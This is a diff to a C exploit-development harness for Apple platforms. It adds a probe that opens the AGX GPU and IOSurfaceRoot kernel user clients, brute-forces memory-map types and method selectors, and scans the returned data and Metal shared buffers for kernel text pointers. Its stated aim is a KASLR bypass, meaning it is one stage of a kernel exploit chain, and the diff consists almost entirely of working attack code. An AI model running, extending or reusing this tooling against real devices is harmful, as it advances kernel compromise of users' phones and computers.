@@ -15902,6 +15902,252 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r380: Deep AGX + IOSurfaceRoot selector probing with inputs.
+ * 1. AGXAcceleratorG19P type=1: selectors 0-200 with struct I/O
+ * 2. IOSurfaceRoot: selectors with surface ID as input
+ * 3. IOConnectCallMethod with combined scalar+struct I/O
+ * 4. AGX MapMemory with specific types (GPU shared memory)
+ */
+static void r380_probe(void) {
+    rlog("\n=== r380: Deep AGX + IOSurfaceRoot Selector Probing ===\n\n");
+    fflush(stdout);
+
+    /* Part 1: Open AGX user client and probe deeply */
+    rlog("--- Part 1: AGXAcceleratorG19P deep probe ---\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef agx_match = IOServiceMatching("AGXAccelerator");
+    io_iterator_t agx_iter = 0;
+    io_service_t agx_svc = 0;
+    io_connect_t agx_conn = 0;
+    if (agx_match) {
+        IOServiceGetMatchingServices(kIOMasterPortDefault, agx_match, &agx_iter);
+        if (agx_iter) {
+            agx_svc = IOIteratorNext(agx_iter);
+            IOObjectRelease(agx_iter);
+        }
+    }
+    if (agx_svc) {
+        kern_return_t kr = IOServiceOpen(agx_svc, mach_task_self(), 1, &agx_conn);
+        rlog("  AGX type=1: kr=0x%x conn=0x%x\n", kr, agx_conn);
+        IOObjectRelease(agx_svc);
+    }
+
+    if (agx_conn) {
+        /* Try MapMemory with types 0-31 */
+        rlog("  MapMemory types 0-31:\n");
+        for (uint32_t mt = 0; mt <= 31; mt++) {
+            mach_vm_address_t addr = 0;
+            mach_vm_size_t size = 0;
+            kern_return_t kr = IOConnectMapMemory64(agx_conn, mt, mach_task_self(),
+                &addr, &size, kIOMapAnywhere);
+            if (kr == KERN_SUCCESS && size > 0) {
+                rlog("    [%u] addr=0x%llx size=0x%llx\n", mt,
+                    (unsigned long long)addr, (unsigned long long)size);
+                /* Scan for kernel text pointers */
+                uint8_t *base = (uint8_t*)(uintptr_t)addr;
+                int ktext_count = 0;
+                size_t scan_limit = (size < 65536) ? (size_t)size : 65536;
+                for (size_t off = 0; off + 7 < scan_limit; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, base + off, 8);
+                    if (v >= 0xfffffff000000000ULL && v <= 0xfffffff7ffffffffULL) {
+                        if (ktext_count < 10)
+                            rlog("      +%zu: 0x%llx KTEXT!\n",
+                                off, (unsigned long long)v);
+                        ktext_count++;
+                    }
+                }
+                rlog("    → %d ktext pointers found (scanned %zu bytes)\n",
+                    ktext_count, scan_limit);
+                IOConnectUnmapMemory64(agx_conn, mt, mach_task_self(), addr);
+            } else if (kr != 0xe00002c2) {
+                rlog("    [%u] kr=0x%x\n", mt, kr);
+            }
+        }
+
+        /* Scalar selectors 0-100 with 1 input (a surface ID or token) */
+        rlog("  Scalar selectors 0-100 (1 input=0x1):\n");
+        for (uint32_t sel = 0; sel <= 100; sel++) {
+            uint64_t sin = 1;
+            uint64_t sout[16] = {0};
+            uint32_t soutcnt = 16;
+            kern_return_t kr = IOConnectCallScalarMethod(agx_conn, sel, &sin, 1, sout, &soutcnt);
+            if (kr == KERN_SUCCESS && soutcnt > 0) {
+                int has_kptr = 0;
+                for (uint32_t j = 0; j < soutcnt; j++)
+                    if (sout[j] >= 0xfffffff000000000ULL) has_kptr = 1;
+                if (has_kptr || soutcnt > 0) {
+                    rlog("    sel=%u cnt=%u", sel, soutcnt);
+                    for (uint32_t j = 0; j < soutcnt && j < 4; j++)
+                        rlog(" [%u]=0x%llx%s", j, (unsigned long long)sout[j],
+                            sout[j] >= 0xfffffff000000000ULL ? "***" : "");
+                    rlog("\n");
+                }
+            }
+        }
+
+        /* Struct selectors with output */
+        rlog("  Struct selectors 0-50 (output only):\n");
+        for (uint32_t sel = 0; sel <= 50; sel++) {
+            uint8_t sout[4096] = {0};
+            size_t soutlen = sizeof(sout);
+            kern_return_t kr = IOConnectCallStructMethod(agx_conn, sel, NULL, 0, sout, &soutlen);
+            if (kr == KERN_SUCCESS && soutlen > 0) {
+                rlog("    sel=%u: %zu bytes", sel, soutlen);
+                int ktext = 0;
+                for (size_t off = 0; off + 7 < soutlen; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, sout + off, 8);
+                    if (v >= 0xfffffff000000000ULL && v <= 0xfffffff7ffffffffULL) {
+                        rlog(" +%zu=0x%llx***", off, (unsigned long long)v);
+                        ktext++;
+                    }
+                }
+                if (ktext == 0) rlog(" (no ktext)");
+                rlog("\n");
+            }
+        }
+
+        IOServiceClose(agx_conn);
+    }
+
+    /* Part 2: IOSurfaceRoot with surface ID as input */
+    rlog("\n--- Part 2: IOSurfaceRoot selectors with input ---\n");
+    fflush(stdout);
+
+    /* Create a surface to get a valid ID */
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys380[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals380[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef crprops = CFDictionaryCreate(NULL,
+        (const void**)keys380, (const void**)vals380, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    IOSurfaceRef surf = IOSurfaceCreate(crprops);
+    uint32_t sid = surf ? IOSurfaceGetID(surf) : 0;
+
+    CFMutableDictionaryRef ios_match = IOServiceMatching("IOSurfaceRoot");
+    io_connect_t ios_conn = 0;
+    if (ios_match) {
+        io_iterator_t ios_iter = 0;
+        IOServiceGetMatchingServices(kIOMasterPortDefault, ios_match, &ios_iter);
+        if (ios_iter) {
+            io_service_t ios_svc = IOIteratorNext(ios_iter);
+            if (ios_svc) {
+                IOServiceOpen(ios_svc, mach_task_self(), 0, &ios_conn);
+                IOObjectRelease(ios_svc);
+            }
+            IOObjectRelease(ios_iter);
+        }
+    }
+
+    if (ios_conn && sid > 0) {
+        rlog("  IOSurfaceRoot conn=0x%x sid=%u\n", ios_conn, sid);
+
+        /* Scalar with surface ID as input */
+        for (uint32_t sel = 0; sel <= 40; sel++) {
+            uint64_t sin = sid;
+            uint64_t sout[16] = {0};
+            uint32_t soutcnt = 16;
+            kern_return_t kr = IOConnectCallScalarMethod(ios_conn, sel, &sin, 1, sout, &soutcnt);
+            if (kr == KERN_SUCCESS && soutcnt > 0) {
+                rlog("    Scalar[%u](sid=%u): cnt=%u", sel, sid, soutcnt);
+                for (uint32_t j = 0; j < soutcnt && j < 4; j++) {
+                    int kptr = (sout[j] >= 0xfffffff000000000ULL);
+                    rlog(" [%u]=0x%llx%s", j, (unsigned long long)sout[j],
+                        kptr ? "***KPTR***" : "");
+                }
+                rlog("\n");
+            }
+        }
+
+        /* Struct with surface ID as 4-byte input */
+        for (uint32_t sel = 0; sel <= 40; sel++) {
+            uint32_t sin = sid;
+            uint8_t sout[4096] = {0};
+            size_t soutlen = sizeof(sout);
+            kern_return_t kr = IOConnectCallStructMethod(ios_conn, sel,
+                &sin, sizeof(sin), sout, &soutlen);
+            if (kr == KERN_SUCCESS && soutlen > 0) {
+                rlog("    Struct[%u](sid): %zu bytes", sel, soutlen);
+                for (size_t off = 0; off + 7 < soutlen; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, sout + off, 8);
+                    if (v >= 0xfffffff000000000ULL)
+                        rlog(" +%zu=0x%llx***", off, (unsigned long long)v);
+                }
+                rlog("\n");
+            }
+        }
+
+        IOServiceClose(ios_conn);
+    }
+
+    /* Part 3: Metal shared memory — scan GPU command buffers for kptrs */
+    rlog("\n--- Part 3: Metal shared memory scan ---\n");
+    fflush(stdout);
+
+    /* Use MTLCreateSystemDefaultDevice via objc_msgSend */
+    id (*msg)(id, SEL) = (id (*)(id, SEL))objc_msgSend;
+    id (*msg_ull)(id, SEL) = (id (*)(id, SEL))objc_msgSend;
+
+    id (*createDevice)(void) = (id (*)(void))dlsym(RTLD_DEFAULT, "MTLCreateSystemDefaultDevice");
+    if (createDevice) {
+        id device = createDevice();
+        if (device) {
+            rlog("  Metal device: %p\n", device);
+            SEL newBufSel = sel_registerName("newBufferWithLength:options:");
+            id (*msg_buf)(id, SEL, unsigned long, unsigned long) =
+                (id (*)(id, SEL, unsigned long, unsigned long))objc_msgSend;
+
+            /* Create shared buffer */
+            id buf = msg_buf(device, newBufSel, 65536, 0 /* MTLStorageModeShared */);
+            if (buf) {
+                SEL contentsSel = sel_registerName("contents");
+                void *ptr = ((void* (*)(id, SEL))objc_msgSend)(buf, contentsSel);
+                rlog("  Shared buffer: %p contents=%p\n", buf, ptr);
+
+                /* Scan for kernel text pointers in the buffer region */
+                if (ptr) {
+                    int found = 0;
+                    for (size_t off = 0; off < 65536; off += 8) {
+                        uint64_t v;
+                        memcpy(&v, (uint8_t*)ptr + off, 8);
+                        if (v >= 0xfffffff000000000ULL && v <= 0xfffffff7ffffffffULL) {
+                            rlog("    +%zu: 0x%llx KTEXT!\n", off, (unsigned long long)v);
+                            found++;
+                            if (found >= 10) break;
+                        }
+                    }
+                    if (!found) rlog("    No ktext in 64K shared buffer\n");
+                }
+            }
+        }
+    } else {
+        rlog("  MTLCreateSystemDefaultDevice not found\n");
+    }
+
+    if (surf) CFRelease(surf);
+    CFRelease(crprops);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+    rlog("\n=== r380 complete ===\n");
+    fflush(stdout);
+}
+
 /* r379: AGXAccelerator GPU driver + sysctl + proc_info scan for KASLR leak.
  * IOSurface alone can't bypass KASLR. Try:
  * 1. AGXAccelerator IOKit user client — MapMemory, selectors, shared memory
@@ -58502,6 +58748,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 383) {
+            rlog("*** rounds=383: Deep AGX + IOSurfaceRoot Selector Probing ***\n");
+            rlog("  AGX MapMemory 0-31, selectors 0-100, Metal shared mem scan.\n\n");
+            fflush(stdout);
+            r380_probe();
+            goto done;
+        }
         if (rounds == 382) {
             rlog("*** rounds=382: AGX GPU + Sysctl + proc_info + csops ***\n");
             rlog("  Alternative attack surfaces for KASLR bypass.\n\n");
@@ -60768,7 +61021,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
